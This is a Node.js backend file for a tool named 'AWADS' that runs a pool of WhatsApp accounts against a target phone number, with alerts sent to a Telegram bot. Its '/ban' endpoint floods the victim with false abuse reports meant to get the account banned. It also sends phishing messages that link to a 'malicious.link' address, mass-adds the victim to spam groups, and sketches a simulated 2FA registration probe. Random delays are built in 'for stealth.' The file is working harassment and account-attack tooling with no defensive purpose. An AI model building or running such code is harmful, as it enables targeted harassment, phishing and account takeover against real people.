// main.js
const express = require('express');
const bodyParser = require('body-parser');
const NodeCache = require('node-cache');
const config = require('./config');
const WhatsAppClientManager = require('./whatsappClient');
const { Telegraf } = require('telegraf'); // Import Telegraf to send messages back

const app = express();
const myCache = new NodeCache({ stdTTL: 3600, checkperiod: 120 }); // Cache for client QR codes, etc.

app.use(bodyParser.json());

// API Key Middleware for security
app.use((req, res, next) => {
    const apiKey = req.headers['x-api-key'];
    if (apiKey && apiKey === config.API_SECRET_KEY) {
        next();
    } else {
        res.status(401).json({ message: 'Unauthorized: Invalid API Key' });
    }
});

// --- WhatsApp Client Management ---
const whatsappClients = new Map(); // Map<clientId, WhatsAppClientManager>
const activeOperations = new Map(); // Map<operationId, {targetNumber, banType, status, clientsUsed}>

// Initialize a pool of WhatsApp clients on startup
for (let i = 0; i < config.WHATSAPP_WORKERS_COUNT; i++) {
    const clientId = `client_${i + 1}`;
    initializeWhatsAppClient(clientId);
}

function initializeWhatsAppClient(clientId) {
    if (whatsappClients.has(clientId)) {
        console.log(`Client ${clientId} already exists. Destroying and re-initializing.`);
        whatsappClients.get(clientId).destroy();
        whatsappClients.delete(clientId);
    }
    const clientManager = new WhatsAppClientManager(
        clientId,
        (message) => sendTelegramMessageToAdmin(message), // Callback for sending Telegram messages
        (id, status, qrCode = null) => updateClientStatus(id, status, qrCode) // Callback for status updates
    );
    whatsappClients.set(clientId, clientManager);
    console.log(`Initialized WhatsApp client: ${clientId}`);
}

function updateClientStatus(clientId, status, qrCode = null) {
    const client = whatsappClients.get(clientId);
    if (client) {
        client.status = status;
        if (qrCode) {
            client.qrCode = qrCode;
            myCache.set(`qr_${clientId}`, qrCode, 300); // Store QR for 5 minutes
        } else {
            myCache.del(`qr_${clientId}`);
        }
        if (status === 'destroyed' || status === 'error' || status === 'disconnected') {
            console.log(`Attempting to re-initialize client ${clientId} due to ${status}.`);
            setTimeout(() => initializeWhatsAppClient(clientId), 5000); // Re-initialize after a delay
        }
    }
}

// Telegram Bot for sending notifications back to admin
const telegramBot = new Telegraf(config.TELEGRAM_BOT_TOKEN);
async function sendTelegramMessageToAdmin(message) {
    if (config.ADMIN_TELEGRAM_ID) {
        try {
            await telegramBot.telegram.sendMessage(config.ADMIN_TELEGRAM_ID, message, { parse_mode: 'Markdown' });
        } catch (error) {
            console.error('Error sending Telegram message to admin:', error.message);
        }
    }
}

// --- API Endpoints ---

// Get system status
app.get('/status', (req, res) => {
    const clientStatuses = Array.from(whatsappClients.values()).map(c => ({
        id: c.clientId,
        status: c.status
    }));
    res.json({
        whatsappClients: {
            total: whatsappClients.size,
            active: Array.from(whatsappClients.values()).filter(c => c.status === 'ready').length,
            statuses: clientStatuses
        },
        queueSize: 0, // No explicit queue for now, operations are async
        activeOperations: Array.from(activeOperations.values())
    });
});

// Add new WhatsApp client
app.post('/whatsapp/add', async (req, res) => {
    const newClientId = `client_${whatsappClients.size + 1}`;
    initializeWhatsAppClient(newClientId);
    const client = whatsappClients.get(newClientId);

    // Wait for QR code to be generated
    let qrCode = await new Promise(resolve => {
        const checkQr = setInterval(() => {
            const cachedQr = myCache.get(`qr_${newClientId}`);
            if (cachedQr) {
                clearInterval(checkQr);
                resolve(cachedQr);
            }
        }, 1000);
    });

    res.json({ clientId: newClientId, qrCode });
});

// Remove WhatsApp client
app.post('/whatsapp/remove', async (req, res) => {
    const { clientId } = req.body;
    const client = whatsappClients.get(clientId);
    if (client) {
        await client.destroy();
        whatsappClients.delete(clientId);
        sendTelegramMessageToAdmin(`WhatsApp client *${clientId}* was removed.`);
        res.json({ message: `Client ${clientId} removed.` });
    } else {
        res.status(404).json({ message: `Client ${clientId} not found.` });
    }
});

// Initiate Ban Operation
app.post('/ban', async (req, res) => {
    const { targetNumber, banType } = req.body;

    if (!targetNumber || !banType) {
        return res.status(400).json({ message: 'Target number and ban type are required.' });
    }

    const availableClients = Array.from(whatsappClients.values()).filter(c => c.status === 'ready');
    if (availableClients.length === 0) {
        return res.status(503).json({ message: 'No WhatsApp clients are ready to perform the operation.' });
    }

    const operationId = `op_${Date.now()}_${Math.random().toString(36).substring(7)}`;
    activeOperations.set(operationId, {
        id: operationId,
        targetNumber,
        banType,
        status: 'pending',
        clientsUsed: [],
        startTime: new Date()
    });

    res.json({ message: `Ban operation ${operationId} initiated.`, operationId });

    // Execute the ban strategy asynchronously
    executeBanStrategy(operationId, targetNumber, banType, availableClients);
});

async function executeBanStrategy(operationId, targetNumber, banType, clients) {
    const operation = activeOperations.get(operationId);
    if (!operation) return;

    operation.status = 'in_progress';
    sendTelegramMessageToAdmin(`*AWADS:* Initiating *${banType}* on *${targetNumber}* with ${clients.length} clients.`);

    const clientPromises = [];
    let usedClientCount = 0;

    for (const clientManager of clients) {
        if (usedClientCount >= (config.WHATSAPP_WORKERS_COUNT || 1)) break; // Limit clients used for a single op

        clientPromises.push((async () => {
            try {
                const delay = Math.floor(Math.random() * (config.BAN_ATTEMPT_INTERVAL_MAX - config.BAN_ATTEMPT_INTERVAL_MIN + 1)) + config.BAN_ATTEMPT_INTERVAL_MIN;
                await new Promise(resolve => setTimeout(resolve, delay)); // Random delay for stealth

                switch (banType) {
                    case 'REPORT_FLOOD':
                        for (let i = 0; i < config.MASS_REPORT_COUNT / clients.length; i++) {
                            const reportType = config.REPORT_TYPES[Math.floor(Math.random() * config.REPORT_TYPES.length)];
                            await clientManager.sendReport(targetNumber, reportType);
                            await new Promise(resolve => setTimeout(resolve, Math.random() * 5000 + 1000)); // Delay between reports
                        }
                        break;
                    case 'MESSAGE_DELUGE':
                        for (let i = 0; i < config.MESSAGE_FLOOD_COUNT / clients.length; i++) {
                            const messageContent = `Urgent Alert! Action Required! Your account is compromised. Click here: http://malicious.link/${Math.random().toString(36).substring(7)}`;
                            await clientManager.sendMessage(targetNumber, messageContent);
                            await new Promise(resolve => setTimeout(resolve, Math.random() * 2000 + 500)); // Delay between messages
                        }
                        break;
                    case 'GROUP_POISON':
                        for (let i = 0; i < config.GROUP_INVITE_COUNT / clients.length; i++) {
                            const groupSubject = `Urgent Alert Group ${Math.random().toString(36).substring(7)}`;
                            await clientManager.addTargetToGroup(targetNumber, groupSubject);
                            await new Promise(resolve => setTimeout(resolve, Math.random() * 10000 + 5000)); // Delay between group adds
                        }
                        break;
                    case '2FA_PROBE':
                        // This is a complex operation. It requires attempting to register *their* number on *your* client.
                        // whatsapp-web.js does not directly expose this functionality for a target number.
                        // This would typically involve using a separate SMS-receiving service and WhatsApp API.
                        // For this implementation, we'll simulate the "attempt" as a conceptual action.
                        console.log(`Client ${clientManager.clientId} *SIMULATED* 2FA probe for ${targetNumber}.`);
                        sendTelegramMessageToAdmin(`*AWADS:* Client ${clientManager.clientId} *simulated* 2FA probe attempt for *${targetNumber}*. (Requires external SMS service for full effect).`);
                        break;
                    default:
                        console.warn(`Unknown ban type: ${banType}`);
                }
                operation.clientsUsed.push({ id: clientManager.clientId, status: 'success' });
            } catch (error) {
                console.error(`Client ${clientManager.clientId} failed for ${targetNumber}, type ${banType}:`, error.message);
                operation.clientsUsed.push({ id: clientManager.clientId, status: 'failed', error: error.message });
                sendTelegramMessageToAdmin(`*AWADS Error:* Client *${clientManager.clientId}* failed for *${targetNumber}* (${banType}): ${error.message}`);
            }
        })());
        usedClientCount++;
    }

    await Promise.allSettled(clientPromises);

    operation.status = 'completed';
    operation.endTime = new Date();
    sendTelegramMessageToAdmin(`*AWADS:* Operation *${operationId}* against *${targetNumber}* (${banType}) *COMPLETED*. Check status for details.`);
    // Optionally, remove from activeOperations after a delay or on user command
    setTimeout(() => activeOperations.delete(operationId), 3600000); // Keep for 1 hour
}


// Start the API server
app.listen(config.API_PORT, () => {
    console.log(`AWADS Backend API running on port ${config.API_PORT}`);
});

// Enable graceful shutdown
process.on('SIGINT', async () => {
    console.log('Shutting down AWADS Backend...');
    for (const client of whatsappClients.values()) {
        await client.destroy();
    }
    process.exit(0);
});
